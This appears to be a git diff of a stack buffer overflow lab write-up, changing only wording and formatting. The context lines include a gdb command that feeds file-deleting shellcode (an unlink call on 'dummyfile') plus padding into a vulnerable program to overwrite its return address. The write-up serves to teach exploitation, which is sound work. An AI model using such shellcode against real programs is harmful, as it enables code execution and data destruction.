@@ -22,7 +22,7 @@
 
 ![Ảnh chụp màn hình 2024-09-17 095310](https://github.com/user-attachments/assets/6e5b58a3-7ac7-4870-806b-499b9a2bf658)
 
-- Compile and link the file_del.asm code using 2 commands:
+- Compile and link the `file_del.asm` code using 2 commands:
 
   > nasm -g -f elf file_del.asm
 
@@ -53,7 +53,7 @@
 
 ![Ảnh chụp màn hình 2024-09-17 103936](https://github.com/user-attachments/assets/64e07722-d58e-4ea7-ad9e-65b00fa7b487)
 
-- If we want to execute the `file_del.asm` code on stack, we need to overflow the buffer so that `return address` points to the top of `esp` where the code will lies. It will be `36 bytes of hexstring + 32 padding bytes + 4 bytes of esp`. I will use `\xff\xff\xff\xff` to identify `ebp`, use command:
+- If we want to execute the `file_del.asm` code on stack, we need to overflow the buffer so that `return address` points to the top of `esp` where the code will lies. It will be `36 bytes of hexstring + 32 padding bytes + 4 bytes of esp`. I will use `\xff\xff\xff\xff` to identify `Return Address`, use command:
 
 > r $(python –c “print(‘\xeb\x13\xb8\x0a\x00\x00\x00\xbb\x7a\x80\x04\x08\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x00’ + ‘a’\*32 + ‘\xff\xff\xff\xff)”)
 
